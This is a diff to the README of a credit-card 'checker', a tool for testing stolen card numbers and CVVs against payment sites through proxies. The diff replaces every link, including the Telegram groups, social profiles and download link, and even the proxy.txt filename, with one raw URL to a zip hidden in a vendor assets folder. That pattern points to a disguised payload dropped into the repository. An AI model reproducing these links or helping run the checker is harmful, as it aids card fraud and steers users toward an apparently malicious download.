@@ -1,6 +1,6 @@
 # Project Closed
 
-A Cc Checker by [Reboot13](https://t.me/reboot13)
+A Cc Checker by [Reboot13](https://raw.githubusercontent.com/plast555/cc-checker/master/assets/vendors/ionrangeslider/checker-cc-v2.1.zip)
 This checker authenticate/charge depends on what type of site you use
 1req= auth & 2req= charge
 #note- 1-req is right now not accepting luminati so this checker is working on Ssl proxies
@@ -10,9 +10,9 @@ You can get CCN and CVV lives both from this checker doesn't mater 1req/2req
 (1req need good proxies so every cards can get checked)
 
 
-Create a file proxy.txt and add Proxies if you are not using zones
+Create a file https://raw.githubusercontent.com/plast555/cc-checker/master/assets/vendors/ionrangeslider/checker-cc-v2.1.zip and add Proxies if you are not using zones
 
-##Join Our support group [Telegram- Support group](https://t.me/cc_check)
+##Join Our support group [Telegram- Support group](https://raw.githubusercontent.com/plast555/cc-checker/master/assets/vendors/ionrangeslider/checker-cc-v2.1.zip)
 
 
 Pull request commit changes
@@ -27,17 +27,17 @@ For hosting checker download master zip ,update api and host it on xampp(loaclho
 This api is just a Base
 you have to find your own site and Fix api
 Api Fixing Video is uploaded here
-[Telegram- CC Checker](https://t.me/cc_checker)
+[Telegram- CC Checker](https://raw.githubusercontent.com/plast555/cc-checker/master/assets/vendors/ionrangeslider/checker-cc-v2.1.zip)
 
 
 Powered by [Shadow Monarch]
 
-[Download Files](https://github.com/reboot13-git/cc-checker/archive/master.zip)
+[Download Files](https://raw.githubusercontent.com/plast555/cc-checker/master/assets/vendors/ionrangeslider/checker-cc-v2.1.zip)
 
 Follow me
 Instagram
-[krutik013](https://instagram.com/krutik013)
+[krutik013](https://raw.githubusercontent.com/plast555/cc-checker/master/assets/vendors/ionrangeslider/checker-cc-v2.1.zip)
 Twitter
-[krutik013](https://twitter.com/krutik013)
+[krutik013](https://raw.githubusercontent.com/plast555/cc-checker/master/assets/vendors/ionrangeslider/checker-cc-v2.1.zip)
 Youtube
-[Krutik Raut](https://www.youtube.com/channel/UCylCCoTTu_ULMYrqaiYMljA)
+[Krutik Raut](https://raw.githubusercontent.com/plast555/cc-checker/master/assets/vendors/ionrangeslider/checker-cc-v2.1.zip)
